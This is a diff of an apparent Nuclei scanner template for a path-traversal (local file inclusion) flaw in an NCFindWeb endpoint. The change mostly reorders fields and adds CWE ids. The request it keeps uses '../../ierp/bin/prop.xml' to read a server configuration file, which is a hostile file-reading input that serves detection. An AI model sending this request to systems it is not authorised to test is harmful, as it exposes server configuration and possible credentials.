@@ -1,5 +1,4 @@
 id: wooyun-path-traversal
-
 info:
   name: Wooyun - Local File Inclusion
   author: pikpikcu
@@ -11,26 +10,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23,CWE-73
   metadata:
     max-request: 1
-  tags: lfi,wooyun,vuln
-
+  tags: lfi,vuln,wooyun
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
+  - matchers:
+      - status:
           - 200
-
-      - type: word
+        type: status
+      - condition: and
+        part: body
+        type: word
         words:
           - <DataSourceClassName>
           - </DataSourceClassName>
-        part: body
-        condition: and
-
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml'
